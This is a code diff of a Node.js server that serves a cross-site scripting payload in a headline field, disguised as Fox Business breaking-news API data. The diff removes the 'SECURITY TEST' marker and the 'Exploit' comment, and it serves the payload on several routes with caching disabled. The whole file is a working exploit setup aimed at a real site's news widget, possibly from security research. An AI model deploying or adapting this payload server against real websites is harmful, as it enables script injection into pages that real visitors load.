@@ -10,16 +10,19 @@ const path = require('path');
 const PORT = process.env.PORT || 3000;
 const PUBLIC_DIR = path.join(__dirname, 'public');
 
-// Exploit 1: JSON payload for CORS/fetch injection (e.g. BreakingNews headline)
+// JSON payload matching Fox Business Spark API format for breaking-news.js
 const jsonPayload = {
   data: {
+    status: { success: true, code: 200 },
+    existing_total: 1,
     results: [{
-      publication_date: '2026-03-03T12:00:00Z',
+      publication_date: new Date().toISOString(),
+      eyebrow: '',
       'main-content': [{
         component: 'BreakingNews',
         model: {
           url: 'https://www.foxbusiness.com/markets',
-          headline: 'SECURITY TEST <img src=x onerror=alert(document.domain)>',
+          headline: '<img src=x onerror=alert(document.domain)>',
           bannerType: 'BreakingNews'
         }
       }]
@@ -38,11 +41,15 @@ const server = http.createServer((req, res) => {
     return;
   }
 
-  // Root: serve JSON payload
-  if (req.url === '/' || req.url === '/payload.json') {
+  // Parse URL without query string
+  const urlPath = req.url.split('?')[0];
+
+  // Serve JSON payload on multiple routes for compatibility
+  if (urlPath === '/' || urlPath === '/payload.json' || urlPath === '/vercel.json' || urlPath === '/breaking.json') {
     res.setHeader('Content-Type', 'application/json');
+    res.setHeader('Cache-Control', 'no-cache, no-store');
     res.writeHead(200);
-    res.end(JSON.stringify(jsonPayload, null, 2));
+    res.end(JSON.stringify(jsonPayload));
     return;
   }
 
